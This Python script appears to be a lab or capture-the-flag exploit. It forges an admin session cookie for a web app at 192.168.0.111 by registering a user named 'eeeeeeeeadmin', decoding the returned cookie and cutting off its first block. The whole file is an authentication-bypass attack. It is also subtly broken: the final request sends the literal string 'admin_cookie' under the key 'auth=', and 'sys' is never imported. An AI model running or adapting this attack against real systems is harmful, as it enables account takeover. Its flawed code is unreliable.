import requests
from base64 import b64decode
import urllib.parse 
from binascii import b2a_base64
from binascii import hexlify
from binascii import unhexlify 

datas = {'username': 'eeeeeeeeadmin', 'password': 'test', 'password_again' : 'test'}
url = "http://192.168.0.111/register.php"
r = requests.post(url, data=datas, allow_redirects = False)
print("[+] Sending Request and create a new user ")
print('[+] Retrieving new cookie')
resp= r.headers['Set-Cookie']
auth = resp[5:]
base64_strs = [auth]

for bstr in base64_strs:
    unquoted_bstr = urllib.parse.unquote(bstr)
    data = b64decode(unquoted_bstr)
    hexdata = hexlify(data)
    s = hexdata.decode("utf-8")
    sx = r"\x" + r"\x".join(s[n : n+2] for n in range(0, len(s), 2))
    ss= s[16:]
    print("[+] Generating new cookie for admin user")
    data_admin = ss.encode('ascii')
    admin_bytes = b2a_base64(unhexlify(data_admin))
    admin_cookie = admin_bytes.decode("utf-8")
    print(admin_cookie)

print("[+] New request with new cookie")

cookies = {'auth=': 'admin_cookie'}
req = requests.get('http://192.168.0.111/index.php', cookies=cookies)
if "logged in as admin!" in req.text:
    print("[+] successfully logged as admin")
    sys.exit(-1)

print("[+]---------")
